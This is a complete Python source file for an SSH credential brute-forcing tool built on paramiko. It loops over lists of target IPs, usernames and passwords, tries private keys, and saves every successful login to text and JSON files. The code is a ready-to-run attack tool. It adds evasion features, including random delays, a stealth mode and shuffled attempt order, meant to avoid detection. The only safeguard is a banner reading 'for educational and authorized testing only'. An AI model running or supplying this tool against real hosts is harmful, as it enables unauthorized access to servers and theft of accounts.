#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Advanced SSH Penetration Testing Tool
Enhanced version with multiple attack vectors and security features
"""

import paramiko
import socket
import threading
import time
import sys
import os
import json
import random
import argparse
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple
import signal
import itertools

# Rich imports for beautiful terminal output
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, TaskID
    from rich.live import Live
    from rich.text import Text
    from rich.logging import RichHandler
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Warning: Rich library not available. Install with: pip install rich")

# Initialize console
console = Console() if RICH_AVAILABLE else None

@dataclass
class SSHCredential:
    """Data class for SSH credentials"""
    ip: str
    port: int
    username: str
    password: str
    login_time: str
    response_time: float
    server_version: str = ""
    banner: str = ""

@dataclass
class AttackStats:
    """Statistics for the attack"""
    total_targets: int = 0
    total_attempts: int = 0
    successful_logins: int = 0
    failed_attempts: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    start_time: float = 0
    end_time: float = 0

class AdvancedSSHCracker:
    def __init__(self):
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.stats = AttackStats()
        self.valid_credentials: List[SSHCredential] = []
        self.user_agents = [
            "OpenSSH_8.9p1",
            "OpenSSH_8.2p1", 
            "OpenSSH_7.4p1",
            "PuTTY_Release_0.76"
        ]
        self.setup_logging()
        self.setup_signal_handlers()

    def setup_logging(self):
        """Setup enhanced logging"""
        log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        
        # File handler
        file_handler = logging.FileHandler(
            f"ssh_pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
            encoding='utf-8'
        )
        file_handler.setLevel(logging.DEBUG)
        
        # Console handler
        if RICH_AVAILABLE:
            console_handler = RichHandler(console=console, show_time=False)
        else:
            console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        
        # Configure logger
        logging.basicConfig(
            level=logging.DEBUG,
            format=log_format,
            handlers=[file_handler, console_handler]
        )
        
        # Suppress paramiko logs
        logging.getLogger("paramiko").setLevel(logging.WARNING)
        
        self.logger = logging.getLogger(__name__)

    def setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown"""
        def handle_interrupt(sig, frame):
            if console:
                console.print("\n[red][!] Received interrupt signal, shutting down gracefully...[/red]")
            else:
                print("\n[!] Received interrupt signal, shutting down gracefully...")
            self.stop_event.set()
            self.generate_final_report()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, handle_interrupt)
        signal.signal(signal.SIGTERM, handle_interrupt)

    def show_banner(self):
        """Display enhanced banner"""
        if console:
            banner_text = """
[bold green]Advanced SSH Penetration Testing Tool v2.0[/bold green]
[cyan]Enhanced Multi-Vector SSH Security Assessment[/cyan]

Features:
• Multi-threaded brute force attacks
• Key-based authentication testing  
• Service enumeration and banner grabbing
• Advanced evasion techniques
• Comprehensive reporting
• Rate limiting and stealth mode

[yellow]⚠️  For Educational and Authorized Testing Only ⚠️[/yellow]
"""
            console.print(Panel(banner_text, title="SSH-PenTester Pro", border_style="magenta"))
        else:
            print("=" * 60)
            print("Advanced SSH Penetration Testing Tool v2.0")
            print("For Educational and Authorized Testing Only")
            print("=" * 60)

    def is_ssh_open(self, ip: str, port: int, timeout: int = 5) -> Tuple[bool, str]:
        """Enhanced SSH port check with banner grabbing"""
        try:
            sock = socket.create_connection((ip, port), timeout=timeout)
            sock.settimeout(timeout)
            
            # Try to get SSH banner
            banner = ""
            try:
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            except:
                pass
            
            sock.close()
            return True, banner
        except socket.timeout:
            self.stats.timeouts += 1
            return False, ""
        except Exception as e:
            self.stats.connection_errors += 1
            self.logger.debug(f"Connection error to {ip}:{port} - {str(e)}")
            return False, ""

    def generate_ssh_config(self) -> Dict:
        """Generate randomized SSH client configuration"""
        return {
            'timeout': random.randint(8, 15),
            'auth_timeout': random.randint(5, 10),
            'banner_timeout': random.randint(3, 8),
            'allow_agent': False,
            'look_for_keys': False
        }

    def ssh_login_attempt(self, ip: str, port: int, username: str, password: str, 
                         config: Dict, delay_range: Tuple[float, float] = (0.5, 2.0)) -> Optional[SSHCredential]:
        """Enhanced SSH login attempt with evasion"""
        if self.stop_event.is_set():
            return None

        # Add random delay for evasion
        if delay_range:
            time.sleep(random.uniform(*delay_range))

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        start_time = time.time()
        
        try:
            # Connect with randomized configuration
            client.connect(
                ip, port=port, username=username, password=password,
                timeout=config['timeout'],
                auth_timeout=config['auth_timeout'],
                banner_timeout=config['banner_timeout'],
                allow_agent=config['allow_agent'],
                look_for_keys=config['look_for_keys']
            )
            
            response_time = time.time() - start_time
            
            # Try to get server information
            server_version = ""
            banner = ""
            try:
                transport = client.get_transport()
                if transport:
                    server_version = transport.remote_version
                    banner = getattr(transport, 'server_version', '')
            except:
                pass
            
            credential = SSHCredential(
                ip=ip,
                port=port,
                username=username,
                password=password,
                login_time=datetime.now().isoformat(),
                response_time=response_time,
                server_version=server_version,
                banner=banner
            )
            
            self.stats.successful_logins += 1
            
            if console:
                console.print(f"\n[bold green][+] SUCCESS: {ip}:{port} | {username}:{password} | Time: {response_time:.2f}s[/bold green]")
            else:
                print(f"[+] SUCCESS: {ip}:{port} | {username}:{password}")
            
            self.logger.info(f"Successful login: {ip}:{port} | {username}:{password}")
            
            return credential
            
        except paramiko.AuthenticationException:
            self.stats.failed_attempts += 1
            self.logger.debug(f"Auth failed: {ip}:{port} | {username}:{password}")
        except paramiko.SSHException as e:
            self.stats.connection_errors += 1
            self.logger.debug(f"SSH error on {ip}:{port} | {str(e)}")
        except socket.timeout:
            self.stats.timeouts += 1
            self.logger.debug(f"Timeout on {ip}:{port}")
        except Exception as e:
            self.stats.connection_errors += 1
            self.logger.debug(f"Unexpected error on {ip}:{port} | {str(e)}")
        finally:
            try:
                client.close()
            except:
                pass
        
        return None

    def test_key_authentication(self, ip: str, port: int, username: str, key_paths: List[str]) -> Optional[SSHCredential]:
        """Test SSH key authentication"""
        if self.stop_event.is_set():
            return None

        for key_path in key_paths:
            if not os.path.exists(key_path):
                continue
                
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                start_time = time.time()
                
                client.connect(
                    ip, port=port, username=username,
                    key_filename=key_path,
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                response_time = time.time() - start_time
                
                credential = SSHCredential(
                    ip=ip,
                    port=port,
                    username=username,
                    password=f"KEY:{key_path}",
                    login_time=datetime.now().isoformat(),
                    response_time=response_time
                )
                
                if console:
                    console.print(f"\n[bold green][+] KEY SUCCESS: {ip}:{port} | {username} | Key: {key_path}[/bold green]")
                else:
                    print(f"[+] KEY SUCCESS: {ip}:{port} | {username} | Key: {key_path}")
                
                return credential
                
            except:
                continue
            finally:
                try:
                    client.close()
                except:
                    pass
        
        return None

    def run_attack_on_target(self, ip: str, port: int, usernames: List[str], 
                           passwords: List[str], threads: int = 10, 
                           max_attempts: int = None, stealth_mode: bool = False,
                           key_paths: List[str] = None) -> List[SSHCredential]:
        """Run comprehensive attack on a single target"""
        
        # Check if SSH is open
        is_open, banner = self.is_ssh_open(ip, port)
        if not is_open:
            if console:
                console.print(f"[yellow][!] Skipping {ip}:{port} - SSH not accessible[/yellow]")
            else:
                print(f"[!] Skipping {ip}:{port} - SSH not accessible")
            return []

        if console:
            console.print(f"[cyan][*] Attacking {ip}:{port} | Banner: {banner[:50] if banner else 'Unknown'}[/cyan]")
        
        target_credentials = []
        
        # Test key authentication first if keys provided
        if key_paths:
            for username in usernames:
                if self.stop_event.is_set():
                    break
                credential = self.test_key_authentication(ip, port, username, key_paths)
                if credential:
                    target_credentials.append(credential)

        # Prepare credential combinations
        combinations = list(itertools.product(usernames, passwords))
        if max_attempts:
            combinations = combinations[:max_attempts]
        
        random.shuffle(combinations)  # Randomize order for evasion
        
        # Configure delays based on stealth mode
        delay_range = (2.0, 5.0) if stealth_mode else (0.1, 0.5)
        
        # Execute brute force attack
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for username, password in combinations:
                if self.stop_event.is_set():
                    break
                
                config = self.generate_ssh_config()
                future = executor.submit(
                    self.ssh_login_attempt, ip, port, username, password, 
                    config, delay_range
                )
                futures.append(future)
                self.stats.total_attempts += 1
            
            # Collect results
            for future in as_completed(futures):
                if self.stop_event.is_set():
                    break
                    
                credential = future.result()
                if credential:
                    target_credentials.append(credential)
                    with self.lock:
                        self.valid_credentials.append(credential)
        
        return target_credentials

    def load_file_list(self, filepath: str, name: str) -> List[str]:
        """Load and validate file lists"""
        if not os.path.exists(filepath):
            error_msg = f"{name} file not found: {filepath}"
            if console:
                console.print(f"[red][-] {error_msg}[/red]")
            else:
                print(f"[-] {error_msg}")
            sys.exit(1)
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                items = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            if not items:
                error_msg = f"{name} file is empty: {filepath}"
                if console:
                    console.print(f"[red][-] {error_msg}[/red]")
                else:
                    print(f"[-] {error_msg}")
                sys.exit(1)
            
            return items
            
        except Exception as e:
            error_msg = f"Error reading {name} file: {str(e)}"
            if console:
                console.print(f"[red][-] {error_msg}[/red]")
            else:
                print(f"[-] {error_msg}")
            sys.exit(1)

    def save_results(self, output_file: str, json_output: str = None):
        """Save results in multiple formats"""
        
        # Save as text format
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"SSH Penetration Test Results\n")
                f.write(f"Generated: {datetime.now().isoformat()}\n")
                f.write(f"=" * 60 + "\n\n")
                
                for cred in self.valid_credentials:
                    f.write(f"{cred.ip}:{cred.port} | {cred.username}:{cred.password} | "
                           f"Time: {cred.response_time:.2f}s | Server: {cred.server_version}\n")
                
                f.write(f"\n" + "=" * 60 + "\n")
                f.write(f"Statistics:\n")
                f.write(f"Total Targets: {self.stats.total_targets}\n")
                f.write(f"Total Attempts: {self.stats.total_attempts}\n")
                f.write(f"Successful Logins: {self.stats.successful_logins}\n")
                f.write(f"Failed Attempts: {self.stats.failed_attempts}\n")
                f.write(f"Timeouts: {self.stats.timeouts}\n")
                f.write(f"Connection Errors: {self.stats.connection_errors}\n")
                
        except Exception as e:
            self.logger.error(f"Error saving results: {str(e)}")

        # Save as JSON format
        if json_output:
            try:
                results_data = {
                    'metadata': {
                        'generated': datetime.now().isoformat(),
                        'tool': 'Advanced SSH Penetration Testing Tool v2.0'
                    },
                    'statistics': asdict(self.stats),
                    'credentials': [asdict(cred) for cred in self.valid_credentials]
                }
                
                with open(json_output, 'w', encoding='utf-8') as f:
                    json.dump(results_data, f, indent=2, ensure_ascii=False)
                    
            except Exception as e:
                self.logger.error(f"Error saving JSON results: {str(e)}")

    def generate_final_report(self):
        """Generate final attack report"""
        if not console:
            return

        self.stats.end_time = time.time()
        duration = self.stats.end_time - self.stats.start_time

        # Create results table
        table = Table(title="Attack Results Summary")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Total Targets", str(self.stats.total_targets))
        table.add_row("Total Attempts", str(self.stats.total_attempts))
        table.add_row("Successful Logins", str(self.stats.successful_logins))
        table.add_row("Failed Attempts", str(self.stats.failed_attempts))
        table.add_row("Timeouts", str(self.stats.timeouts))
        table.add_row("Connection Errors", str(self.stats.connection_errors))
        table.add_row("Duration", f"{duration:.2f} seconds")
        table.add_row("Success Rate", f"{(self.stats.successful_logins/max(self.stats.total_attempts,1)*100):.2f}%")

        console.print("\n")
        console.print(table)

        # Show found credentials
        if self.valid_credentials:
            cred_table = Table(title="Valid Credentials Found")
            cred_table.add_column("Target", style="cyan")
            cred_table.add_column("Username", style="green")
            cred_table.add_column("Password", style="yellow")
            cred_table.add_column("Response Time", style="blue")
            
            for cred in self.valid_credentials:
                cred_table.add_row(
                    f"{cred.ip}:{cred.port}",
                    cred.username,
                    cred.password,
                    f"{cred.response_time:.2f}s"
                )
            
            console.print("\n")
            console.print(cred_table)

def create_parser():
    """Create argument parser"""
    parser = argparse.ArgumentParser(
        description="Advanced SSH Penetration Testing Tool",
        epilog="Example: python ssh_advanced.py -I targets.txt -U users.txt -P passwords.txt -t 20 --stealth",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Required arguments
    parser.add_argument("-I", "--iplist", required=True, 
                       help="Path to target IP/hostname list file")
    parser.add_argument("-U", "--userlist", required=True, 
                       help="Path to username list file")
    parser.add_argument("-P", "--passlist", required=True, 
                       help="Path to password list file")
    
    # Optional arguments
    parser.add_argument("-p", "--port", type=int, default=22, 
                       help="SSH port to test")
    parser.add_argument("-t", "--threads", type=int, default=10, 
                       help="Number of concurrent threads")
    parser.add_argument("-o", "--output", default="ssh_results.txt", 
                       help="Output file for results")
    parser.add_argument("--json", dest="json_output", 
                       help="Save results in JSON format")
    parser.add_argument("--max-attempts", type=int, 
                       help="Maximum attempts per target")
    parser.add_argument("--stealth", action="store_true", 
                       help="Enable stealth mode (slower but more evasive)")
    parser.add_argument("--keys", nargs='+', 
                       help="SSH private key files to test")
    parser.add_argument("--timeout", type=int, default=10, 
                       help="Connection timeout in seconds")
    
    return parser

def main():
    """Main execution function"""
    cracker = AdvancedSSHCracker()
    cracker.show_banner()
    
    parser = create_parser()
    args = parser.parse_args()
    
    # Load target lists
    ips = cracker.load_file_list(args.iplist, "IP")
    usernames = cracker.load_file_list(args.userlist, "Username")
    passwords = cracker.load_file_list(args.passlist, "Password")
    
    # Validate key files if provided
    key_paths = []
    if args.keys:
        for key_path in args.keys:
            if os.path.exists(key_path):
                key_paths.append(key_path)
            else:
                cracker.logger.warning(f"Key file not found: {key_path}")
    
    # Initialize statistics
    cracker.stats.total_targets = len(ips)
    cracker.stats.start_time = time.time()
    
    # Display attack configuration
    if console:
        config_text = f"""
Targets: {len(ips)}
Usernames: {len(usernames)}
Passwords: {len(passwords)}
Threads: {args.threads}
Port: {args.port}
Stealth Mode: {'Enabled' if args.stealth else 'Disabled'}
SSH Keys: {len(key_paths) if key_paths else 'None'}
Max Attempts: {args.max_attempts if args.max_attempts else 'Unlimited'}
"""
        console.print(Panel(config_text, title="Attack Configuration", border_style="blue"))
    
    try:
        # Execute attacks
        for i, ip in enumerate(ips, 1):
            if cracker.stop_event.is_set():
                break
                
            if console:
                console.print(f"\n[bold blue][{i}/{len(ips)}] Processing target: {ip}[/bold blue]")
            else:
                print(f"[{i}/{len(ips)}] Processing target: {ip}")
            
            target_results = cracker.run_attack_on_target(
                ip=ip,
                port=args.port,
                usernames=usernames,
                passwords=passwords,
                threads=args.threads,
                max_attempts=args.max_attempts,
                stealth_mode=args.stealth,
                key_paths=key_paths
            )
            
            if target_results and console:
                console.print(f"[green][+] Found {len(target_results)} valid credential(s) for {ip}[/green]")
    
    except KeyboardInterrupt:
        if console:
            console.print("\n[yellow][!] Attack interrupted by user[/yellow]")
        else:
            print("\n[!] Attack interrupted by user")
    
    finally:
        # Generate final report and save results
        cracker.generate_final_report()
        cracker.save_results(args.output, args.json_output)
        
        if console:
            console.print(f"\n[bold green][✓] Results saved to: {args.output}[/bold green]")
            if args.json_output:
                console.print(f"[bold green][✓] JSON results saved to: {args.json_output}[/bold green]")
        else:
            print(f"\n[✓] Results saved to: {args.output}")

if __name__ == "__main__":
    main()